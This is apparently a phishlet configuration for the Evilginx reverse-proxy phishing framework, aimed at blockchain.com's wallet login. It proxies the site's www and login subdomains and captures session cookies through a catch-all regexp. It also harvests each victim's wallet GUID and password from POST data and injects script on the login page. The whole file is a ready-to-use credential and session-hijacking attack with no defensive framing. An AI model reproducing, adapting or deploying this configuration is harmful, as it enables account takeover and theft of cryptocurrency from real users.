author: '@shadowbeyz'
min_ver: '2.3.0'
proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'blockchain.com', session: true, is_landing: false}
  - {phish_sub: 'login', orig_sub: 'login', domain: 'blockchain.com', session: true, is_landing: true}
sub_filters:
  - {triggers_on: 'www.blockchain.com', orig_sub: 'www', domain: 'blockchain.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: 'https://{hostname}/manifest.1566419449540.js', replace: 'https://{hostname}/manifest.1566419449540.js', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: 'https://{hostname}/vendor.67536ad5ab.js', replace: 'https://{hostname}/vendor.67536ad5ab.js', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: 'https://{hostname}/app.5ff289e6ae.js', replace: 'https://{hostname}/app.5ff289e6ae.js', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: 'https://{hostname}/img/site.webmanifest', replace: 'https://{hostname}/img/site.webmanifest', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
auth_tokens:
  - domain: '.blockchain.com'
    keys: ['sessionid','.*,regexp']
credentials:
  username:
    key: 'guid'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
login:
  domain: 'login.blockchain.com'
  path: '/#/login'
js_inject:  
  - trigger_domains: ["login.blockchain.com"]
    trigger_paths: ["/#/login"]
    trigger_params: ["CSP_NONCE**"]
    script: |
      window.NONCE = '**CSP_NONCE**'
js_inject:  
  - trigger_domains: ["login.blockchain.com"]
    trigger_paths: ["/#/login"]
    trigger_params: ["window.NONCE"]
    script: |
      window.NONCE = '35df06371b8cafbeed4a3d7f8d64ac32';

